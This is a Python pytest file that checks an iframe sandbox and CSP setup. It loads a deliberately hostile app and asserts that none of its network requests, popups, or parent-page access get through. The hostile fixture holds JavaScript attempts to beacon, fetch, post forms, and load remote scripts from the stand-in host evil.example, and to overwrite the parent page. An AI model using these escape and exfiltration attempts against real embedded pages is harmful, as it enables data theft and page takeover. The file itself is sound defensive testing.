"""Sandbox acceptance gate (build spec §11): a hostile app in the frontend's iframe setup
makes no outgoing request and cannot read or navigate the parent.

The parent page reproduces `frontend/src/components/AppFrame.tsx` exactly: an iframe with
`sandbox="allow-scripts"` and `srcdoc` = the backend shell + app HTML, served with the
frontend's response CSP (`frame-src 'none'`, see `frontend/next.config.ts`). It is served
from a local HTTP server so the parent has a real http origin like localhost:3000.
"""

import asyncio
import html as html_lib
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from app.agent.shell import build_srcdoc

HOSTILE_APP = r"""
<div id="out">hostile app</div>
<form id="f" method="post" action="https://evil.example/form"><input name="x" value="1"></form>
<script>
function render(data) {
  var log = [];
  try { fetch('https://evil.example/fetch'); } catch (e) { log.push('fetch blocked'); }
  try { var i = new Image(); i.src = 'https://evil.example/beacon.png'; document.body.appendChild(i); } catch (e) {}
  try { navigator.sendBeacon('https://evil.example/sendbeacon', 'x'); } catch (e) {}
  try { var w = window.open('https://evil.example/popup'); log.push('open=' + (w ? 'window' : 'null')); } catch (e) { log.push('open threw'); }
  try { parent.document.body.innerHTML = 'PWNED'; log.push('parent writable'); } catch (e) { log.push('parent blocked'); }
  try { top.location.href = 'https://evil.example/top'; } catch (e) { log.push('top nav blocked'); }
  try { document.getElementById('f').submit(); } catch (e) { log.push('form blocked'); }
  try { var s = document.createElement('script'); s.src = 'https://evil.example/x.js'; document.head.appendChild(s); } catch (e) {}
  try { var l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://evil.example/x.css'; document.head.appendChild(l); } catch (e) {}
  try { localStorage.setItem('a', 'b'); log.push('storage ok'); } catch (e) { log.push('storage blocked'); }
  try { document.cookie = 'a=b'; log.push('cookie=' + document.cookie); } catch (e) { log.push('cookie blocked'); }
  document.getElementById('out').textContent = log.join(' | ');
  window.parent.postMessage({type: 'test:log', log: log.join(' | ')}, '*');
  setTimeout(function () { try { location.href = 'https://evil.example/self'; } catch (e) {} }, 50);
}
</script>
"""

PARENT_CSP = "frame-src 'none'; frame-ancestors 'none'"


def _parent_page(app_html: str) -> str:
    srcdoc = html_lib.escape(build_srcdoc(app_html), quote=True)
    return f"""<!doctype html><html><head><title>parent</title></head><body>
<p id="secret">parent secret</p>
<iframe id="app" sandbox="allow-scripts" referrerpolicy="no-referrer" srcdoc="{srcdoc}"></iframe>
<script>
window.__msgs = [];
var frame = document.getElementById('app');
window.addEventListener('message', function (ev) {{
  if (ev.source !== frame.contentWindow) return;
  window.__msgs.push(ev.data);
  if (ev.data && ev.data.type === 'demux:ready') {{
    frame.contentWindow.postMessage({{type: 'demux:data', data: {{}}}}, '*');
  }}
}});
</script></body></html>"""


@pytest.fixture
def parent_server():
    pages: dict[str, str] = {}

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            body = pages.get(self.path, "").encode()
            self.send_response(200 if body else 404)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Security-Policy", PARENT_CSP)
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *args):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield server.server_address[1], pages
    server.shutdown()


async def test_hostile_app_is_contained(parent_server):
    from playwright.async_api import async_playwright

    port, pages = parent_server
    pages["/"] = _parent_page(HOSTILE_APP)
    origin = f"http://127.0.0.1:{port}"
    outgoing: list[str] = []
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        context = await browser.new_context()

        async def route(r):
            url = r.request.url
            if url.startswith(origin):
                await r.continue_()
            else:
                outgoing.append(url)
                await r.abort()

        await context.route("**/*", route)
        page = await context.new_page()
        popups: list[str] = []
        context.on("page", lambda pg: popups.append(pg.url))
        await page.goto(f"{origin}/")
        await asyncio.sleep(1.5)

        assert page.url == f"{origin}/", "top-level navigation must be blocked"
        assert await page.inner_text("#secret") == "parent secret"
        msgs = await page.evaluate("() => window.__msgs")
        await browser.close()

    assert outgoing == [], f"requests escaped the sandbox: {outgoing}"
    frame_text = next(m["log"] for m in msgs if m.get("type") == "test:log")
    assert popups == [], "popups must be blocked"
    assert "parent blocked" in frame_text
    assert "storage blocked" in frame_text
    assert "parent writable" not in frame_text
    assert any(m.get("type") == "demux:rendered" for m in msgs)
